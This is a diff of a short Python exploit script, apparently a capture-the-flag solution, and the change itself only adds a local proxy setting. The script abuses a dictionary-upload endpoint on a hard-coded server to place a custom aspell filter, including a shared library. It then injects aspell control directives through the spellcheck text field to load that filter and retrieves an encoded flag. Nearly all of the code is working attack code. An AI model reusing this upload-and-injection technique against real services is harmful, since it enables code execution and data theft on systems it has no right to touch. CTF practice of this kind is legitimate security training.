@@ -8,16 +8,17 @@ import json
 TO_UPLOAD = ["blub.amf", "blub-filter.info", "blub-filter.so"]
 HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
 SERVER = "http://116.202.161.100:5000"
+PROXY = {"http": "http://127.0.0.1:8080"}
 
 # Exploit vulnerability in /dicts/update to upload custom aspell filter files
 for file in TO_UPLOAD:
-  requests.get('http://116.202.161.100:5000/dicts/update', files={'dict': (file, open("aspell-attack-filter/" + file, 'rb'))})
+  requests.get('http://116.202.161.100:5000/dicts/update', files={'dict': (file, open("aspell-attack-filter/" + file, 'rb'))}, proxies=PROXY)
 
 # Activate the custom aspell filter
 # $$cs add-filter-path,/home/challenge/challenge/dicts/
 # $$cs add-filter,blub
 # +blub
-requests.post(SERVER + "/spellcheck", data='text=$$cs+add-filter-path,/home/challenge/challenge/dicts/%0a$$cs+add-filter,blub%0a%2bblub', headers=HEADERS)
+requests.post(SERVER + "/spellcheck", data='text=$$cs+add-filter-path,/home/challenge/challenge/dicts/%0a$$cs+add-filter,blub%0a%2bblub', headers=HEADERS, proxies=PROXY)
 
 # Grab the flag
 resp = requests.get(SERVER + "/dicts")
@@ -26,4 +27,3 @@ encoded_flag = dicts_json["dicts"][-1][::-1] # [-1] -> last file, [::-1] -> reve
 flag = b64decode(encoded_flag).decode().strip()
 
 print(f"Flag = {flag}")
-
